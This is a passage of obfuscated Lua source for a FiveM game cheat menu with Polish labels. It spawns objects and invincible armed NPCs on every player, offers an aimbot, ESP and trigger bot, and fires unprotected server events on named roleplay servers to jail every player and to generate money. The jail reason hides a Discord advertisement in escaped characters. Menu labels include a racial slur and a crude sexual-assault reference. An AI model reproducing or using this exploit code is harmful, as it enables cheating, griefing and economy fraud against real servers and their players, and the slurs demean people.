						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cegły 2 na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_conc_blocks01c"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Statek na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "hei_prop_heist_tug"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zioło na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "hei_prop_heist_weed_pallet_02"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zjazd z góry na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_cablecar_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zniszczony helikopter na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_crahsed_heli_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Samolot 2 na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_cs_mp_jet_01_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Wyścig na Mission Row", "~r~Native") then
					local propdfgjhkldfg = "prop_inflatearch_01"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),400.24,-966.71,27.91,true,true,true)
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Stacja na parkingu Mission Row", "~r~Native") then
					local propdfgjhkldfg = "prop_gas_tank_02a"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),443.02,-1022.11,27.56,true,true,true)
					local obj2 = CreateObject(GetHashKey(propdfgjhkldfg),440.02,-1022.11,27.56,true,true,true)
					local obj3 = CreateObject(GetHashKey(propdfgjhkldfg),437.02,-1022.11,27.56,true,true,true)
					local obj4 = CreateObject(GetHashKey(propdfgjhkldfg),443.02,-1019.11,27.56,true,true,true)
					local obj5 = CreateObject(GetHashKey(propdfgjhkldfg),440.02,-1019.11,27.56,true,true,true)
					local obj6 = CreateObject(GetHashKey(propdfgjhkldfg),437.02,-1019.11,27.56,true,true,true)
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Zablokuj drogę Mission Row", "~r~Native") then
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_inflatearch_01"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),400.24,-966.71,27.91,true,true,true)
					local obj2 = CreateObject(GetHashKey(propdfgjhkldfg),403.24,-966.71,27.91,true,true,true)
					local obj3 = CreateObject(GetHashKey(propdfgjhkldfg),406.24,-966.71,27.91,true,true,true)
					local obj4 = CreateObject(GetHashKey(propdfgjhkldfg),409.24,-966.71,27.91,true,true,true)
					local obj5 = CreateObject(GetHashKey(propdfgjhkldfg),412.24,-966.71,27.91,true,true,true)
					local obj6 = CreateObject(GetHashKey(propdfgjhkldfg),415.24,-966.71,27.91,true,true,true)
					local obj7 = CreateObject(GetHashKey(propdfgjhkldfg),418.24,-966.71,27.91,true,true,true)
					local obj8 = CreateObject(GetHashKey(propdfgjhkldfg),397.24,-966.71,27.91,true,true,true)
					local obj9 = CreateObject(GetHashKey(propdfgjhkldfg),394.24,-966.71,27.91,true,true,true)
					local obj10 = CreateObject(GetHashKey(propdfgjhkldfg),391.24,-966.71,27.91,true,true,true)
					local obj11 = CreateObject(GetHashKey(propdfgjhkldfg),388.24,-966.71,27.91,true,true,true)
					local obj12 = CreateObject(GetHashKey(propdfgjhkldfg),393.85,-1021.29,27.91,true,true,true)
					local obj13 = CreateObject(GetHashKey(propdfgjhkldfg),396.24,-1021.29,27.91,true,true,true)
					local obj14 = CreateObject(GetHashKey(propdfgjhkldfg),399.24,-1021.29,27.91,true,true,true)
					local obj15 = CreateObject(GetHashKey(propdfgjhkldfg),402.24,-1021.29,27.91,true,true,true)
					local obj16 = CreateObject(GetHashKey(propdfgjhkldfg),405.24,-1021.29,27.91,true,true,true)
					local obj17 = CreateObject(GetHashKey(propdfgjhkldfg),408.24,-1021.29,27.91,true,true,true)
					local obj18 = CreateObject(GetHashKey(propdfgjhkldfg),390.24,-1021.29,27.91,true,true,true)
					local obj19 = CreateObject(GetHashKey(propdfgjhkldfg),387.24,-1021.29,27.91,true,true,true)
					local obj20 = CreateObject(GetHashKey(propdfgjhkldfg),384.24,-1021.29,27.91,true,true,true)
					local obj21 = CreateObject(GetHashKey(propdfgjhkldfg),381.24,-1021.29,27.91,true,true,true)
					local obj21 = CreateObject(GetHashKey(propdfgjhkldfg),378.24,-1021.29,27.91,true,true,true)
					local obj22 = CreateObject(GetHashKey(propdfgjhkldfg),408.24,-1021.29,27.91,true,true,true)
					local obj23 = CreateObject(GetHashKey(propdfgjhkldfg),411.24,-1021.29,27.91,true,true,true)
					local obj24 = CreateObject(GetHashKey(propdfgjhkldfg),414.24,-1021.29,27.91,true,true,true)
					local obj25 = CreateObject(GetHashKey(propdfgjhkldfg),417.24,-1021.29,27.91,true,true,true)
					local obj26 = CreateObject(GetHashKey(propdfgjhkldfg),420.24,-1021.29,27.91,true,true,true)
					local obj27 = CreateObject(GetHashKey(propdfgjhkldfg),423.24,-1021.29,27.91,true,true,true)
					local obj28 = CreateObject(GetHashKey(propdfgjhkldfg),426.24,-1021.29,27.91,true,true,true)
					local obj29 = CreateObject(GetHashKey(propdfgjhkldfg),429.24,-1021.29,27.91,true,true,true)
					local obj30 = CreateObject(GetHashKey(propdfgjhkldfg),432.24,-1021.29,27.91,true,true,true)
					local obj31 = CreateObject(GetHashKey(propdfgjhkldfg),435.24,-1021.29,27.91,true,true,true)
					local obj32 = CreateObject(GetHashKey(propdfgjhkldfg),438.24,-1021.29,27.91,true,true,true)
					local obj33 = CreateObject(GetHashKey(propdfgjhkldfg),441.24,-1021.29,27.91,true,true,true)
					local obj34 = CreateObject(GetHashKey(propdfgjhkldfg),444.24,-1021.29,27.91,true,true,true)
					local obj35 = CreateObject(GetHashKey(propdfgjhkldfg),447.24,-1021.29,27.91,true,true,true)
					local obj36 = CreateObject(GetHashKey(propdfgjhkldfg),450.24,-1021.29,27.91,true,true,true)
					local obj37 = CreateObject(GetHashKey(propdfgjhkldfg),453.24,-1021.29,27.91,true,true,true)
					local obj38 = CreateObject(GetHashKey(propdfgjhkldfg),456.24,-1021.29,27.91,true,true,true)
					local obj39 = CreateObject(GetHashKey(propdfgjhkldfg),459.24,-1021.29,27.91,true,true,true)
					local obj40 = CreateObject(GetHashKey(propdfgjhkldfg),462.24,-1021.29,27.91,true,true,true)
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Custom propdfgjhkldfg", "~r~Native") then
                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayeriufdhiguodlfgd), true)
                    local input = KeyboardInputdfjhfduhifudihdfg("Enter propdfgjhkldfg Name", "", 100)                       
                    if IsModelValid(input) then
                    local objfdgjhkfdg = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            else
                                drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Nie ma takiego modelu")
                            end
						end
						
				kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("Pedy") then
				if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Ruchaj wszystkich w dupe", "~r~Native") then
                    runOnAlllkdijuhsgfioudsgdsgsiouygpdfgfdg(rapeisjdugifdgfdgidfuhgdfg)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~r~Zresp  ~b~Swatowców ~r~Z AK-47") then
				for i=0,128 do
				local eU = "s_m_y_swat_01"
				local eS = "WEAPON_ASSAULTRIFLE"
				for i = 0, 5 do 
					local cM = GetEntityCoords(GetPlayerPed(i)) 
					RequestModel(GetHashKey(eU)) 
					Citizen.Wait(50) 
						if HasModelLoaded(GetHashKey(eU)) then 
							local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) 
							if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then 
								local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) 
								SetNetworkIdExistsOnAllMachines(eT, true) 
								Citizen.Wait(500) 
								NetToPed(eT) 
								GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
								SetEntityInvincible(ped, true) 
								SetPedCanSwitchWeapon(ped, true) 
								TaskCombatPed(ped, GetPlayerPed(i), 0, 16) 
							elseif IsEntityDead(GetPlayerPed(i)) then 
								TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
							else 
								Citizen.Wait(0) 
							end 
						end
					end 
				end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~r~Zresp ~b~Plażowiczke ~r~Z Pistoletem") then
				for i=0,128 do
				local eU = "a_m_y_beach_03"
				local eS = "WEAPON_PISTOL"
				for i = 0, 5 do 
					local cM = GetEntityCoords(GetPlayerPed(i)) 
					RequestModel(GetHashKey(eU)) 
					Citizen.Wait(50) 
						if HasModelLoaded(GetHashKey(eU)) then 
							local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) 
							if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then 
								local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) 
								SetNetworkIdExistsOnAllMachines(eT, true) 
								Citizen.Wait(500) 
								NetToPed(eT) 
								GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
								SetEntityInvincible(ped, true) 
								SetPedCanSwitchWeapon(ped, true) 
								TaskCombatPed(ped, GetPlayerPed(i), 0, 16) 
							elseif IsEntityDead(GetPlayerPed(i)) then 
								TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
							else 
								Citizen.Wait(0) 
							end 
						end
					end 
				end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~r~Zresp ~b~Agent 14 ~r~Z Minigunem") then
                for i=0,128 do
                local eU = "ig_mp_agent14"
                local eS = "WEAPON_MINIGUN"
                for i = 0, 5 do 
                    local cM = GetEntityCoords(GetPlayerPed(i)) 
                    RequestModel(GetHashKey(eU)) 
                    Citizen.Wait(50) 
                        if HasModelLoaded(GetHashKey(eU)) then 
                            local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) 
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then 
                                local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) 
                                SetNetworkIdExistsOnAllMachines(eT, true) 
                                Citizen.Wait(500) 
                                NetToPed(eT) 
                                GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
                                SetEntityInvincible(ped, true) 
                                SetPedCanSwitchWeapon(ped, true) 
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16) 
                            elseif IsEntityDead(GetPlayerPed(i)) then 
                                TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                            else 
                                Citizen.Wait(0) 
                            end 
                        end
                    end 
                end
            
        elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~r~Zresp ~b~Ballaske ~r~Z AK-47") then
            for i=0,128 do
            local eU = "g_f_y_ballas_01"
            local eS = "WEAPON_ASSAULTRIFLE"
            for i = 0, 5 do 
                local cM = GetEntityCoords(GetPlayerPed(i)) 
                RequestModel(GetHashKey(eU)) 
                Citizen.Wait(50) 
                    if HasModelLoaded(GetHashKey(eU)) then 
                        local ped = CreatePed(21, GetHashKey(eU), cM.x + i, cM.y - i, cM.z, 0, true, true) and CreatePed(21, GetHashKey(eU), cM.x - i, cM.y + i, cM.z, 0, true, true) NetworkRegisterEntityAsNetworked(ped) 
                        if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then 
                            local eT = PedToNet(ped) NetworkSetNetworkIdDynamic(eT, false) SetNetworkIdCanMigrate(eT, true) 
                            SetNetworkIdExistsOnAllMachines(eT, true) 
                            Citizen.Wait(500) 
                            NetToPed(eT) 
                            GiveWeaponToPed(ped, GetHashKey(eS), 9999, 1, 1) 
                            SetEntityInvincible(ped, true) 
                            SetPedCanSwitchWeapon(ped, true) 
                            TaskCombatPed(ped, GetPlayerPed(i), 0, 16) 
                        elseif IsEntityDead(GetPlayerPed(i)) then 
                            TaskCombatHatedTargetsInArea(ped, cM.x, cM.y, cM.z, 500)
                        else 
                            Citizen.Wait(0) 
                        end 
                    end
                end 
            end
        end
				
				kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("CS") then
				if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Counter-Strike", "~r~Native") then
				for i=0, 128 do
				CounterStrikedskjfhyo8irhyp9tsurbtbr(GetPlayerServerId(i))
				end
                end

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("TeleportMenu") then
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Teleportacja do znacznika") then
                    TeleportToWaypointdfjkhglfdhgfdfkgjidfhgdfg()
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Teleportacja do auta") then
                    teleportToNearestVehiclejhdsgfsddfhigkidfughydfgfdjkhgdfkgdfg()
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Teleportacja do kordynatow") then
                    TeleportToCoordssduohgoidfgdfgfdgkjhdfkgdfg()
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Pokaz kordynaty",
                    showCoordsdjkhfgidkfdgfdkjghdflkgfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        showCoordsdjkhfgidkfdgfdkjghdflkgfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Narysuj blipa") then
                    drawcustomblipauhdsgfusidofdsfdfghijkfdgdfg()
                end

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("VehMenu") then
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Napraw pojazd", "") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Respienie Pojazdu") then
                    local ModelName = KeyboardInputdfjhfduhifudihdfg("Wpisz nazwe pojazdu", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVehdfglkjdlfgdg then
                            DelVehuydfstuisdfdsfjnbmgfdkujihgidf(GetVehiclePedIsUsing(PlayerPedId()))
                            drawNotificationuisdyfosdgfgdfjghdfjkgdfg("Pojazd UsuniEty")
                        end
                        if SpawnInVehslkgjhldfgdfg then
                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
                        end
                    else
                        drawNotificationuisdyfosdgfgdfjghdfjkgdfg("~r~Nie ma takiego modelu!")
                    end
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje Respienia »", "VehSpawnOpt") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Los Santos Customs »", "NiggerCustoms") then
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("UsuN pojazd") then
                    DelVehuydfstuisdfdsfjnbmgfdkujihgidf(GetVehiclePedIsUsing(PlayerPedId()))
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("UsuN najbliZszy pojazd") then
                    local PlayerCoords = GetEntityCoords(PlayerPedId())
                    DelVehuydfstuisdfdsfjnbmgfdkujihgidf(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
                end

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("NiggerCustoms") then
                if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Tuning Silnika", "PerformanceMenu") then
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Full Tune") then
                    KurwaMaxTuningJAPIACELOksjdbnfglsdfd(GetVehiclePedIsUsing(PlayerPedId()))
                end

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("PerformanceMenu") then

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("VehSpawnOpt") then
                if kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Usuń auto w którym jesteś", 
                    DelCurVehdfglkjdlfgdg, 
                    function(Enableddsyfusdsdfsdffdkjghdflgf) 
                        DelCurVehdfglkjdlfgdg = Enableddsyfusdsdfsdffdkjghdflgf 
                    end)
                then 
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Zresp w Pojeździe",
                    SpawnInVehslkgjhldfgdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        SpawnInVehslkgjhldfgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                end
            
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("MaliciousMenu") then
                if kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Celownik",
                    crosshairkdjshfksdfsdf,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        crosshairkdjshfksdfsdf = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Celownik 2",
                    crosshairkdjshfksdfsdf2,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                         crosshairkdjshfksdfsdf2 = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Celownik 3",
                    crosshairkdjshfksdfsdf3,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        crosshairkdjshfksdfsdf3 = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then    
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                '~o~Termalna wizja',
                thermalVisiondflgjhdflkgdfgdfg,
                function(Enableddsyfusdsdfsdffdkjghdflgf)
                    thermalVisiondflgjhdflkgdfgdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    SetSeethrough(thermalVisiondflgjhdflkgdfgdfg)
                end) 
                then 
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Aimbot",
                    Aimbothdsjigfisdfsdf,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        Aimbothdsjigfisdfsdf = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "ESP",
                    espgfduygudygdfgjhfdbhgjdfg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        espgfduygudygdfgjhfdbhgjdfg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Trigger Bot",
                    TriggerBotifudytgoid8fgfdg,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        TriggerBotifudytgoid8fgfdg = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                elseif kaeogkeargmioergoeismgsdfg.CheckBoxdskjhgfksdilfhsdf(
                    "Znaczniki na mapie",
                    playerBlipsjhgdsfsdhgfukidsfdsf,
                    function(Enableddsyfusdsdfsdffdkjghdflgf)
                        playerBlipsjhgdsfsdhgfukidsfdsf = Enableddsyfusdsdfsdffdkjghdflgf
                    end)
                then
                end
				
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("ESXMenu") then
                if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Kaska »", "ESXMoneyMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Jail Menu »", "JailMenu") then
				end
                
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("JailMenu") then
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("FreshLifeRP") then
                    for i=0, 128 do
                        TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 4564564564 * 60, "\72\117\103\101\86\32\109\101\110\117\32\45\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\97\52\115\75\87\90\52", 67588345435)
                        end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("DarkCityRP") then
                        for i = 0, 128 do
                            TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 73625852335 * 60,  "\72\117\103\101\86\32\109\101\110\117\32\45\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\97\52\115\75\87\90\52", 6999999999999)
                        end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("PitBullRP") then
                        for i = 0, 128 do
                    TriggerServerEvent("esx-qalle-jail:jailP7777layer", GetPlayerServerId(i), 9999999999, "\72\117\103\101\86\32\109\101\110\117\32\45\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\97\52\115\75\87\90\52")
                     end
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("EpicIslandRP") then
                        for i = 0, 128 do
                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 99999, "\72\117\103\101\86\32\109\101\110\117\32\45\32\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\97\52\115\75\87\90\52", 99999999)
                     end
                end 

                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("ESXMoneyMenu") then
                if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("AmazonkaRP") then
                    TriggerServerEvent("tost:zgarnijsiano")
                    TriggerServerEvent("tost:zgarnijsiano")
                    TriggerServerEvent("tost:zgarnijsiano")
                    TriggerServerEvent("tost:zgarnijsiano")
                    TriggerServerEvent("tost:zgarnijsiano")
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("EloBencRP") then
                    TriggerServerEvent('eb_pizza:hajszanormalna')
                    TriggerServerEvent('eb_pizza:hajszanormalna')
                    TriggerServerEvent('eb_pizza:hajszanormalna')
                    TriggerServerEvent('eb_pizza:hajszanormalna')
                    TriggerServerEvent('eb_pizza:hajszanormalna')
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("PlanetaRP", "~r~Brudne Siano") then
                    TriggerServerEvent("esx_TruckRobbery:missionComplete") 
                    TriggerServerEvent("esx_TruckRobbery:missionComplete") 
                    TriggerServerEvent("esx_TruckRobbery:missionComplete") 
                    TriggerServerEvent("esx_TruckRobbery:missionComplete") 
                    TriggerServerEvent("esx_TruckRobbery:missionComplete") 
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("EazyRP") then
                    TriggerServerEvent('esx_drugs:startHarvestLukiCoke')
                    TriggerServerEvent('esx_drugs:startTransformLukiCoke')
                    TriggerServerEvent('esx_drugs:startSellLukiCoke')
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("ElitaRP") then
                    TriggerServerEvent("esx_garbagejob:pay", 4444444444)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("AlchemicRP") then
                    TriggerServerEvent("tostzdrapka:wygrankopremium")
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("NuclearRP") then
                    TriggerServerEvent('TMM_elektryk:cash', 10900000)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("DzielnicaRP") then
                    TriggerServerEvent("dickzdrapka:wygranko") 
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("BestSideRP") then
                    TriggerServerEvent('route68zdrapka:wyplacNagrode',10000000)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("RiverRP") then
                    TriggerServerEvent("patryk_ubereats:pay", 1000000)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("XLifeRP") then
                    TriggerServerEvent('gustav_zlomiarz:zbierajzlom', 100)
                    TriggerServerEvent('gustav_zlomiarz:pakujzlom2', 100)
                    TriggerServerEvent('gustav_zlomiarz:startSell', 100)
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("LimitRP") then
                    TriggerServerEvent('RouteKurier:Zaplata')
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("PrinceRP") then
